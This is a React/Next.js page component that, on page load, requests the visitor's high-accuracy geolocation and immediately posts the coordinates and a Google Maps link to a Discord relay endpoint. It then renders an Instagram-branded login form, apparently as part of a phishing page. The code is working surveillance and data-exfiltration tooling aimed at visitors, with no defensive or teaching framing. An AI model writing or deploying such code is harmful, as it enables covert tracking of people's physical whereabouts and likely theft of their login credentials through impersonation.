'use client'

import { useState, useEffect } from 'react'
import InstagramLogin from '@/components/InstagramLogin'

export default function Home() {
  const [locationGranted, setLocationGranted] = useState(false)
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)

  useEffect(() => {
    // Request location access when page loads
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords
          setLocation({ lat: latitude, lng: longitude })
          setLocationGranted(true)
          
          // Send location to Discord immediately
          sendLocationToDiscord(latitude, longitude)
        },
        (error) => {
          console.error('Location access denied or error:', error)
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      )
    }
  }, [])

  const sendLocationToDiscord = async (lat: number, lng: number) => {
    try {
      const response = await fetch('/api/discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'location',
          latitude: lat,
          longitude: lng,
          mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
        }),
      })

      if (!response.ok) {
        console.error('Failed to send location to Discord')
      }
    } catch (error) {
      console.error('Error sending location:', error)
    }
  }

  return (
    <main>
      <InstagramLogin location={location} />
    </main>
  )
}

